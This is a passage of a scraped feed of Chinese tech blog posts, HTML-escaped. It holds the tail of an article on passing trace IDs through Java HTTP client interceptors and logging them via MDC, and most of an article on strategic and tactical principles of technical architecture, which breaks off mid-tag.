data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; CloseableHttpClient httpClient = HttpClientBuilder.create()&lt;br/&gt;            .addInterceptorFirst(&lt;span&gt;new&lt;/span&gt; HttpClientTraceIdInterceptor())&lt;br/&gt;            .build();&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;通过&lt;/span&gt;&lt;span&gt;&lt;strong&gt;addInterceptorFirst&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;方法为HttpClient添加拦截器。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;2、OKHttp：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;实现OKHttp拦截器：&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;OkHttpTraceIdInterceptor&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; &lt;span&gt;Interceptor&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; Response &lt;span&gt;intercept&lt;/span&gt;&lt;span&gt;(Chain chain)&lt;/span&gt; &lt;span&gt;throws&lt;/span&gt; IOException &lt;/span&gt;{&lt;br/&gt;        String traceId = MDC.get(Constants.TRACE_ID);&lt;br/&gt;        Request request = &lt;span&gt;null&lt;/span&gt;;&lt;br/&gt;        &lt;span&gt;if&lt;/span&gt; (traceId != &lt;span&gt;null&lt;/span&gt;) {&lt;br/&gt;            &lt;span&gt;//添加请求体&lt;/span&gt;&lt;br/&gt;            request = chain.request().newBuilder().addHeader(Constants.TRACE_ID, traceId).build();&lt;br/&gt;        }&lt;br/&gt;        Response originResponse = chain.proceed(request);&lt;br/&gt;&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; originResponse;&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;实现&lt;/span&gt;&lt;strong&gt;&lt;span&gt;Interceptor&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;拦截器&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;，重写interceptor方法，实现逻辑和HttpClient差不多，如果能够获取到当前线程的traceId则向下透传。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;为OkHttp添加拦截器：&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;  &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; OkHttpClient client = &lt;span&gt;new&lt;/span&gt; OkHttpClient.Builder()&lt;br/&gt;            .addNetworkInterceptor(&lt;span&gt;new&lt;/span&gt; OkHttpTraceIdInterceptor())&lt;br/&gt;            .build();&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;调用addNetworkInterceptor方法添加拦截器。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;3、RestTemplate：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;实现RestTemplate拦截器：&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;RestTemplateTraceIdInterceptor&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; &lt;span&gt;ClientHttpRequestInterceptor&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; ClientHttpResponse &lt;span&gt;intercept&lt;/span&gt;&lt;span&gt;(HttpRequest httpRequest, &lt;span&gt;byte&lt;/span&gt;[] bytes, ClientHttpRequestExecution clientHttpRequestExecution)&lt;/span&gt; &lt;span&gt;throws&lt;/span&gt; IOException &lt;/span&gt;{&lt;br/&gt;        String traceId = MDC.get(Constants.TRACE_ID);&lt;br/&gt;        &lt;span&gt;if&lt;/span&gt; (traceId != &lt;span&gt;null&lt;/span&gt;) {&lt;br/&gt;            httpRequest.getHeaders().add(Constants.TRACE_ID, traceId);&lt;br/&gt;        }&lt;br/&gt;&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; clientHttpRequestExecution.execute(httpRequest, bytes);&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;实现ClientHttpRequestInterceptor接口，并重写intercept方法，其余逻辑都是一样的不重复说明。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;为RestTemplate添加拦截器：&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;restTemplate.setInterceptors(Arrays.asList(&lt;span&gt;new&lt;/span&gt; RestTemplateTraceIdInterceptor()));&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;调用setInterceptors方法添加拦截器。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;4、第三方服务拦截器：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;HTTP调用第三方服务接口全流程traceId需要第三方服务配合，第三方服务需要添加拦截器拿到request header中的traceId并添加到MDC中。&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;LogInterceptor&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; &lt;span&gt;HandlerInterceptor&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; &lt;span&gt;preHandle&lt;/span&gt;&lt;span&gt;(HttpServletRequest request, HttpServletResponse response, Object handler)&lt;/span&gt; &lt;span&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;//如果有上层调用就用上层的ID&lt;/span&gt;&lt;br/&gt;        String traceId = request.getHeader(Constants.TRACE_ID);&lt;br/&gt;        &lt;span&gt;if&lt;/span&gt; (traceId == &lt;span&gt;null&lt;/span&gt;) {&lt;br/&gt;            traceId = TraceIdUtils.getTraceId();&lt;br/&gt;        }&lt;br/&gt;        &lt;br/&gt;        MDC.put(&lt;span&gt;&quot;traceId&quot;&lt;/span&gt;, traceId);&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;;&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;postHandle&lt;/span&gt;&lt;span&gt;(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)&lt;/span&gt;&lt;br/&gt;            &lt;span&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;afterCompletion&lt;/span&gt;&lt;span&gt;(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)&lt;/span&gt;&lt;br/&gt;            &lt;span&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;        MDC.remove(Constants.TRACE_ID);&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;说明：&lt;/span&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;先从request header中获取traceId&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;从request header中获取不到traceId则说明不是第三方调用，直接生成一个新的traceId&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;将生成的traceId存入MDC中&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;除了需要添加拦截器之外，还需要在日志格式中添加traceId的打印，如下：&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt; &lt;span&gt;&amp;lt;&lt;span&gt;property&lt;/span&gt; &lt;span&gt;name&lt;/span&gt;=&lt;span&gt;&quot;pattern&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;[TRACEID:%X{traceId}] %d{HH:mm:ss.SSS} %-5level %class{-1}.%M()/%L - %msg%xEx%n&lt;span&gt;&amp;lt;/&lt;span&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;&lt;span&gt;注意：需要添加&lt;/span&gt;&lt;span&gt;&lt;strong&gt;%X{traceId}&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;h2&gt;干货分享&lt;/h2&gt;&lt;blockquote&gt;&lt;p&gt;最近将个人学习笔记整理成册，使用PDF分享。关注我，回复如下代码，即可获得百度盘地址，无套路领取！&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;•&lt;/span&gt;001：《Java并发与高并发解决方案》学习笔记；&lt;/span&gt;&lt;span&gt;&lt;span&gt;•&lt;/span&gt;002：《深入JVM内核——原理、诊断与优化》学习笔记；&lt;/span&gt;&lt;span&gt;&lt;span&gt;•&lt;/span&gt;003：《Java面试宝典》&lt;/span&gt;&lt;span&gt;&lt;span&gt;•&lt;/span&gt;004：《Docker开源书》&lt;/span&gt;&lt;span&gt;&lt;span&gt;•&lt;/span&gt;005：《Kubernetes开源书》&lt;/span&gt;&lt;span&gt;&lt;span&gt;•&lt;/span&gt;006：《DDD速成（领域驱动设计速成）》&lt;/span&gt;&lt;span&gt;&lt;span&gt;•&lt;/span&gt;007：&lt;strong&gt;全部&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;•&lt;/span&gt;008：&lt;strong&gt;加技术群讨论&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;h2&gt;加个关注不迷路&lt;/h2&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzI4ODQ3NjE2OA==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/C93dCHmGrWy2s7mVRlKoQM9ib4kthJ3S8oSFyqIqLTNJicVlGnRgUmXCFyH7lGE8TqCC0LYDGnum3ZIHqT3ubsDA/0?wx_fmt=png&quot; data-nickname=&quot;IT牧场&quot; data-alias=&quot;itmuch_com&quot; data-signature=&quot;IT牧场公众号，BAT 技术专家分享开发、架构、运维相关干货！&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;p&gt;&lt;small&gt;喜欢就点个&quot;在看&quot;呗^_^&lt;/small&gt;&lt;/p&gt;&lt;/pre&gt;
                &lt;/div&gt;

                

                



                
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>c0594cc4ed364ad2e72edd824e2fcfc2</guid>
<title>【超赞】技术架构的战略和战术原则</title>
<link>https://toutiao.io/k/36wdaow</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content &quot; id=&quot;js_content&quot;&gt;
                    

                    
                    
                    
                    &lt;h3 data-tool=&quot;mdnice编辑器&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;em&gt;&lt;span&gt;&lt;span&gt;欢迎关注方志朋的博客，回复”666“获面试宝典&lt;/span&gt;&lt;/span&gt;&lt;/em&gt;&lt;/h3&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzAxNjk4ODE4OQ==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/rtJ5LhxxzwnbUicAvdMbPRUnia3f4BqeTWKY36vv0Fo7EKp2vzDFQoStoOpOIITicknjibGLyWYAtftKt39aSH4lTw/0?wx_fmt=png&quot; data-nickname=&quot;方志朋&quot; data-alias=&quot;walkingstory&quot; data-signature=&quot;号主为CSDN博客之星，博客访问量突破一千万，著有畅销书《深入理解SpringCloud与微服务构建》。主要分享Java、后端架构等技术，用大厂程序员的视角来探讨技术进阶、面试指南、职业规划等。15W技术人的选择！&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;p&gt;技术架构，是将产品需求转变为技术实现的过程。技术架构解决的问题包括了如何进行纯技术层面的分层、开发框架选择、语言选择（这里以 JAVA 语言为主）、涉及到各自非功能性需求的技术点（安全、性能、大数据）。技术架构是确定组成应用系统实际运行的技术组件、技术组件之间的关系，以及部署到硬件的策略。&lt;/p&gt;&lt;p&gt;技术架构面临最大的挑战是“不确定性”。在技术架构上，很多时候就会面临这种选择。是要选择业界最新的技术？还是选择团队最熟悉的技术？如果选择最新的技术，遇到新技术出了问题怎么解决？如果选择目前熟悉的技术，后续技术演进怎么办？这些都是架构师在做技术架构过程中需要考虑的。&lt;/p&gt;&lt;p&gt;业务在千变万化、技术在层出不穷，没有一套通用的技术架构模式来适用所有的系统。那么，我们如何保证在做技术架构时，能够实现一个稳定、出色的系统。面对这些“不确定性”时的架构设计问题，这里从战略和战术两个层面来提供一些设计原则。战略层提供的是技术架构的方法和思路，属于顶层设计；战术层提供的是技术架构的技术实践方式，更偏向详细设计。&lt;/p&gt;&lt;p&gt;&lt;span&gt;战&lt;/span&gt;&lt;span&gt;略层设计原则&lt;/span&gt;&lt;/p&gt;&lt;p&gt;战略层的设计原则就是：合适原则、简单原则、演化原则。&lt;/p&gt;&lt;p&gt;&lt;span&gt;1.1 合适原则&lt;/span&gt;&lt;/p&gt;&lt;p&gt;技术人员有一种很强的技术情怀，就是在做设计的过程中，很希望挑战新的技术、在项目中采用最新的框架、或者自己重造一个比业界的还要牛的轮子。这样才能够显示出自己的优秀，以至于不让自己显的那么平庸。比如，在项目中重新造一个能够解决亿万级数据的新的 xx 流式计算技术，比 flink 还要牛一百倍；有或者在项目中使用最新的 xx 技术，能让系统承担亿级用户的访问。&lt;/p&gt;&lt;p&gt;那么现实是，如果在设计过程中一味追求新技术，往往失败的可能性很高。&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;没有那么多人，却想干那么多活&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;现实环境中我们一个业务团队可能就十几个人，项目工期短、上线要求快。在这种情况下，如果还要抽调几个人去研究、搭建、维护新的技术框架，对于项目势必会造成延期的影响。&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;没有那么多积累，却想一步登天&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;很多业界领先的方案，不是一帮优秀的开发加在一起，加班加点就能做出来的。而是经过几年时间的发展才逐步完善和初具规模。如果我们也想自己做一套类似的技术，不是说不可能。我们需要集合当下的技术实力、技术积累，做出适合自己团队情况的技术评估。&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;没有最新，只要最合适&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;所有新的技术刚出来都是打着比旧技术拥有更加出色的性能、提供更加优秀的扩展性。是不是使用新技术，就能解决一切问题了？新技术的出道，势必是解决某一场景下的问题，并不是一味万能良药。只有了解清楚每种技术的产生背景，适用场景，才能出一个对自己项目最优的选择。技术选型没有最新，只有最合适。&lt;/p&gt;&lt;p&gt;总结一下，合适原则就是适合优于业界领先。&lt;/p&gt;&lt;p&gt;&lt;span&gt;1.2 简单原则&lt;/span&gt;&lt;/p&gt;&lt;p&gt;我们总是希望能将我们的软件设计的精美、宏大，这样才能彰显我们系统的复杂度和难度。我们是不是会遇到这样的场景，在做设计方案的时候，如果一个解决方案很简单，而且能很快的满足需求。在评审方案时，就会有人觉得这个方案是不是太简单了，没有什么技术含量，是不是需要再设计的复杂一点。&lt;/p&gt;&lt;p&gt;系统是不是一定要设计的复杂？在回答这个问题前，我们先看下软件领域的结构复杂性和逻辑复杂性。&lt;/p&gt;&lt;p&gt;&lt;span&gt;（1）结构复杂性&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;结构复杂的系统有两个特点：&lt;/span&gt;&lt;span&gt;第一，组成的组件数量很多；&lt;/span&gt;&lt;span&gt;第二，这些组件之间的关系很复杂。&lt;/span&gt;&lt;span&gt;如下图：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.26835043409629045&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YriaiaJPb26VOjoNXrahuic8dvLOo1r958Az7miaDhVrDYJicr9p0EukwAxgHoz84xwEEDTrqU8uLkkjZVzR1icEyDpg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1267&quot;/&gt;&lt;/p&gt;&lt;p&gt;图 1&lt;/p&gt;&lt;p&gt;结构上的复杂性存在的第一个问题是，组件越多，就越有可能其中某个组件出现故障，从而导致系统故障。假设组件的故障概率是 1%（有 1% 的时间不可用），那么 2 个组件的系统可用性是 99%&lt;span&gt;*&lt;/span&gt;&lt;span&gt;99%=98%，5 个组件的系统可用性是 99%&lt;span&gt;*&lt;/span&gt;&lt;/span&gt;99%&lt;span&gt;*&lt;/span&gt;&lt;span&gt;99%&lt;span&gt;*&lt;/span&gt;&lt;/span&gt;99%*99%=95%，两者相差 3%。说明组件越多，系统稳定性就越差。&lt;/p&gt;&lt;p&gt;结构上的复杂性存在的第二个问题是，某个组件改动，会影响关联的组件。比如上图中 C 组件发生改动，会影响 A、B、D，而 A 有会影响 E。这样就会形成一连串的多比诺效应。&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt; （2）逻辑复杂性&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;意识到结构复杂性的问题后，只要减少组件就能让系统结构变简单？&lt;/span&gt;&lt;span&gt;这样做还是行不通，原因在于除了结构的复杂性，还有逻辑的复杂性，如果一个组件的逻辑太复杂，通用会带来问题。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;我们试想一下，把淘宝的所有功能都在一个组件中实现，可以想象这个系统要有多庞大：几百人维护一个系统、代码分支几十个、需求变更应接不暇、不同分支的回归测试、修改一段代码可能影响整个系统的运行等等。这些场景相信大家都不希望看到的。&lt;/p&gt;&lt;p&gt;总结一下，简单原则就是大道至简。&lt;/p&gt;&lt;p&gt;&lt;span&gt;1.3 演化原则&lt;/span&gt;&lt;/p&gt;&lt;p&gt;软件架构和建筑架构很多相同的地方，架构这个词也是从建筑领域借鉴过来的。比如，软件架构描述的是系统的结构、以及各模块之间的关系。而建筑结构描述的是一幢建筑的结构，以及建筑内部各部件如何有机的组成。&lt;/p&gt;&lt;p&gt;但是，软件架构和建筑架构有一个本质上的差异：那就是建筑一旦完成就不会再变，而软件却需要根据业务的发展不断的变化。对于建筑来说，永恒是主题；而对于软件来说，变化才是主题。&lt;/p&gt;&lt;p&gt;如果没有意识到“软件架构需要根据业务发展不断变化”这个本质，在做架构设计的时候很容易陷入一个误区：试图一步到位设计一个软件架构，期望不管业务如何变化，架构都稳如磐石。如果是按照这样的目标是设计，一开始上来就做出一套看似是终极的方案，投入庞大的资源做各种预测、分析。结果是投入巨大的资源、开发周期漫长，最终跌跌撞撞落地的系统，却发现已经无法很好的满足现有的业务。&lt;/p&gt;&lt;p&gt;所以技术架构设计需要一个过程：&lt;/p&gt;&lt;p&gt;首先，要满足当前的业务需求进行技术架构设计&lt;/p&gt;&lt;p&gt;其次，架构要不断地在实际应用过程中迭代，保留优秀的设计，修复有缺陷的设计，改正错误的设计，去掉无用的设计，使架构逐渐完善。&lt;/p&gt;&lt;p&gt;第三，当业务发生变化时，架构要扩展、重构、甚至重写；代码也许会重写，但有价值的经验、教训、逻辑、设计却可以在新架构中延续。&lt;/p&gt;&lt;p&gt;总结一下，演化原则就是演化优于一步到位。&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;战术层设计原则&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;战术层的设计原则分为 3 部分：&lt;/span&gt;&lt;span&gt;高并发原则、高可用原则、业务设计原则。&lt;/span&gt;&lt;span&gt;这些原则是对技术架构设计过程中提供详细的指导思路，帮助你做技术选型、技术拆分。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;2.1 高并发原则&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;设计高并发的系统，需要考虑以下几个方面的设计：&lt;/span&gt;&lt;span&gt;无状态、拆分、服务化、消息队列、数据异构、缓存。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;（1）无状态&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;无状态应用，&lt;/span&gt;&lt;span&gt;便于水平&lt;/span&gt;&lt;span&gt;扩展&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;有&lt;/span&gt;&lt;span&gt;状态配置可通过配置中心实现无状&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;（2） 拆分&lt;/span&gt;&lt;/span&gt;&lt;span/&gt;&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;系统维度：按照系统功能、业务拆分，比如购物车、结算、订单等。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;功能维度：对系统功能再做细粒度拆分。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;读写维度：根据读写比例特征拆分；读多，可考虑多级缓存；写多，可考虑分库分表。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;AOP 维度：根据访问特征，按照 AOP 进行拆分.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;模块维度：对整体代码结构划分 web、service、dao。&lt;/p&gt;&lt;p&gt;&lt;span&gt;（3）服务化&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;服务&lt;/span&gt;&lt;span&gt;化演进：&lt;/span&gt;&lt;span&gt;进程内服务 - 单机远程服务 - 集群手动注&lt;/span&gt;&lt;span&gt;册服务 - 自动注册和发现服务 - 服务的分组、隔离、路由 - 服务治理。&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;考虑服务分组、隔离、限流、黑白名单、超时、重试机制、路由、故障补偿等。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;span&gt;（4）消&lt;/span&gt;&lt;span&gt;息队列&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;（5&lt;/span&gt;&lt;span&gt;）数&lt;/span&gt;&lt;span&gt;据异构&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt; （6）缓存&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section&gt;&lt;br/&gt;&lt;/section&gt;&lt;p&gt;&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;用户层：DNS 缓存、浏览器 DNS 缓存、操作系统 DNS 缓存、本地 DNS 服务商缓存、DNS 服务器缓存、客户端缓存、浏览器缓存、APP 客户端缓存。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;代理层：CDN 缓存（一般基于 ATS、Varnish、Nginx、Squid 等构建，边缘节点 - 二级节点 - 中心节点 - 源站）&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;接入层：Nginx 的 Proxy_cache 代理缓存，或者 Nginx+Lua+Redis 做业务数据缓存。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;应用层：页面静态化、业务数据缓存（Redis/Memcache/ 本地文件等）、消息队列&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;数据层：NoSQL（Redis、Memcache、SSDB 等）&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;span&gt;2.2 高可用原则&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1. 降级&lt;/span&gt;&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;降级开关集中化管理：将开关配置信息推送到各个应用。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;可降级的多级读服务：如服务调用降级为只读本地缓存。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;开关前置化：如 Nginx+Lua 配置降级策略，引流流量；可基于此做灰度策略。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;业务降级：高并发下，保证核心功能，次要功能可由同步改为异步策略或屏蔽功能。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;2. 限流&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;3. 可回滚&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2.3 业务设计原则&lt;/span&gt;&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;防重设计&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;幂等设计&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;流程定义&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;状态与状态机&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;后台系统操作可反馈&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;后台系统审批化&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;文档注释&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;备份&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;span&gt;技术架构图&lt;/span&gt;&lt;/p&gt;&lt;p&gt;技术架构图是将系统的技术方案、技术选型通过视图的方式进行展现。技术架构图分为两类：一类，功能需求技术架构图（逻辑架构图），是描绘如何通过技术组件来实现系统产品功能的图。另一来，非功能需求技术架构图（物理架构图），是描绘如何通过物理部署的来实现系统运行的图。&lt;/p&gt;&lt;p&gt;&lt;span&gt;3.1 逻辑架构图&lt;/span&gt;&lt;/p&gt;&lt;p&gt;功能需求技术架构图以产品架构图和应用架构图为基础。实现每个功能点需要使用什么技术、技术实现逻辑如何，就提现在技术架构图上。功能需要技术架构图绘制可以按照“整体 - 局部 - 整体”的思路实现。&lt;/p&gt;&lt;p&gt;&lt;span&gt; 1. 整体&lt;/span&gt;&lt;/p&gt;&lt;p&gt;首先可以按照应用架构图的应用分布得到应用分布框架。如下：&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.584375&quot; data-s=&quot;300,640&quot; 